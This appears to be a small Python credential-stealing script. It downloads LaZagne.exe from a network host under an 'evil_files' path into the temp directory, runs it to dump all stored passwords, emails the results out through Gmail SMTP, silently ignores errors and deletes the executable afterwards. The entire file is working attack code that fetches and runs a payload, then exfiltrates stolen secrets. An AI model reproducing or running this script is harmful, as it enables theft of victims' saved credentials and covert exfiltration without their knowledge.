import requests, subprocess, smtplib, os, tempfile

# Do not try to download it
link = 'http://192.168.2.125/evil_files/LaZagne.exe'
gmail = ''
passwd = ''
command = 'LaZagne.exe all'

def arrange_dir():
    temp_dir = tempfile.gettempdir()
    os.chdir(temp_dir)

def download(url):
    get_response = requests.get(url)
    file_name = link.split('/')[-1]
    with open(file_name,'wb') as output_file:
        output_file.write(get_response.content)

def send_email(email,passwd,content):
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,passwd)
    server.sendmail(email,email,content)
    server.quit()

def getInfo():
    try:
        result = subprocess.check_output(command, shell = True)
        if result:
            send_email(gmail,passwd,result)
    except Exception as E:
        pass

if __name__ == '__main__':
    arrange_dir()
    download(link)
    getInfo()
    os.remove('LaZagne.exe')
    
